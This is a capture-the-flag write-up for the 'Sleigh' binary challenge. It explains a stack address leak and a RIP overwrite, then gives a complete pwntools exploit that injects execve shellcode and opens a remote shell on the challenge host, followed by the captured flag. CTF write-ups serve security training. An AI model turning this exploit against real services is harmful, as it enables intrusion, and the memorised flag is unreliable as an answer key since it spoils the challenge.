# Sleigh

## Challenge

Simple binary that has NX disabled.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

## Solution

We are given a stack address leak, so we can overwrite RIP to jump to our buffer.

Since NX is disabled, we can put shellcode in this buffer to spawn a shell.

## Exploit

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 138.68.144.222 --port 32698 sleigh
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('sleigh')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '138.68.144.222'
port = int(args.PORT or 32698)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      PIE enabled
# RWX:      Has RWX segments

io = start()

io.sendlineafter(b"> ", b"1")
io.recvuntil(b"sleigh: [")
leak = int(io.recvuntil(b"]", drop=True), 0)

log.success("Leak: " + hex(leak))

# Shellcode from http://shell-storm.org/shellcode/files/shellcode-806.php by Dad`
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = flat({
    0: shellcode,
    0x40 + 0x8: leak,
    })

io.sendlineafter(b"> ", payload)

io.interactive()
```

## Flag

`HTB{d4sh1nG_thr0ugH_th3_sn0w_1n_4_0n3_h0r53_0p3n_sl31gh!!!}`
